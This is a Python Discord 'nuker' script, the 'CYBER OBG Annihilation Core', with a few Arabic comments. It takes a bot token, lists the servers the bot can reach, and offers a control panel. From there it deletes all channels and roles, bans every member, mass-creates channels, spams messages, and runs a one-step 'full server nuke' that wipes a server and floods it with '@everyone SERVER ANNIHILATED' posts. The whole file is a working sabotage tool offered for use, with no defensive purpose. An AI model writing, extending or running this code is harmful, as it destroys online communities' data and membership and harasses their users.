import discord
from discord.ext import commands
import os
import asyncio
from colorama import Fore, Style, init

init(autoreset=True)

class AnnihilationCore:
    def __init__(self):
        self.token = ""
        self.bot = None

    def banner(self):
        os.system('clear')
        print(f"{Fore.RED}{Style.BRIGHT}--- [ CYBER OBG: THE ANNIHILATION CORE v6.0 ] ---")
        print(f"{Fore.WHITE}Status: Extreme Destruction Mode | Framework: Discord.py")
        print("-" * 60)

    async def start(self):
        self.banner()
        self.token = input(f"{Fore.YELLOW}[!] Enter Bot Token: {Fore.WHITE}")
        
        # تفعيل كل الـ Intents برمجياً لضمان رؤية السيرفرات والأعضاء
        intents = discord.Intents.all()
        self.bot = commands.Bot(command_prefix=".", intents=intents)

        @self.bot.event
        async def on_ready():
            print(f"{Fore.GREEN}[+] Access Granted: {self.bot.user.name}")
            print(f"{Fore.CYAN}[*] Ready to execute. Fetching guilds...")
            await self.main_menu()

        try:
            await self.bot.start(self.token)
        except Exception as e:
            print(f"{Fore.RED}[-] Login Error: {e}")

    async def main_menu(self):
        while True:
            guilds = list(self.bot.guilds)
            if not guilds:
                print(f"{Fore.RED}[!] No servers found. Did you enable 'Intents' in Dev Portal?")
                return

            print(f"\n{Fore.CYAN}--- [ SELECT TARGET SERVER ] ---")
            for i, g in enumerate(guilds):
                print(f"[{i}] {g.name} ({g.member_count} members)")
            
            try:
                choice = int(input(f"\n{Fore.YELLOW}Select Index: {Fore.WHITE}"))
                target = guilds[choice]
                await self.execution_menu(target)
            except: break

    async def execution_menu(self, guild):
        while True:
            print(f"\n{Fore.RED}--- [ CONTROL PANEL: {guild.name.upper()} ] ---")
            print("[1] Delete All Channels   [4] Mass Create Channels")
            print("[2] Delete All Roles      [5] Global Message Spam")
            print("[3] Ban All Members       [6] FULL SERVER NUKE")
            print("[0] Back to Servers")
            
            op = input(f"\n{Fore.CYAN}Choose Operation: {Fore.WHITE}")

            if op == "1":
                print(f"{Fore.YELLOW}[*] Deleting channels...")
                for c in guild.channels:
                    try: await c.delete()
                    except: pass
            
            elif op == "2":
                print(f"{Fore.YELLOW}[*] Deleting roles...")
                for r in guild.roles:
                    if r.name != "@everyone" and r < guild.me.top_role:
                        try: await r.delete()
                        except: pass
            
            elif op == "3":
                print(f"{Fore.RED}[*] Banning everyone...")
                for m in guild.members:
                    if m.id != self.bot.user.id:
                        try: await m.ban(reason="NUKED BY OBG")
                        except: pass

            elif op == "4":
                name = input("Channel Name: ")
                num = int(input("How many? "))
                print(f"{Fore.BLUE}[*] Creating {num} channels...")
                for _ in range(num):
                    try: await guild.create_text_channel(name)
                    except: pass

            elif op == "5":
                msg = input("Message Content: ")
                count = int(input("Messages per channel: "))
                for channel in guild.text_channels:
                    for _ in range(count):
                        try: await channel.send(msg)
                        except: pass

            elif op == "6":
                print(f"{Fore.RED}[!!!] INITIATING TOTAL NUCLEAR DESTRUCTION...")
                # 1. مسح كل الرومات والرتب فوراً
                tasks = [c.delete() for c in guild.channels]
                tasks += [r.delete() for r in guild.roles if r.name != "@everyone" and r < guild.me.top_role]
                await asyncio.gather(*tasks, return_exceptions=True)
                
                # 2. حظر الأعضاء
                for m in guild.members:
                    if m.id != self.bot.user.id:
                        try: await m.ban()
                        except: pass
                
                # 3. بناء رومات جديدة وسبام
                for i in range(30):
                    try:
                        new = await guild.create_text_channel(f"obg-nuke-{i}")
                        await new.send("@everyone SERVER ANNIHILATED BY CYBER OBG")
                    except: pass
            
            elif op == "0": break

if __name__ == "__main__":
    core = AnnihilationCore()
    asyncio.run(core.start())
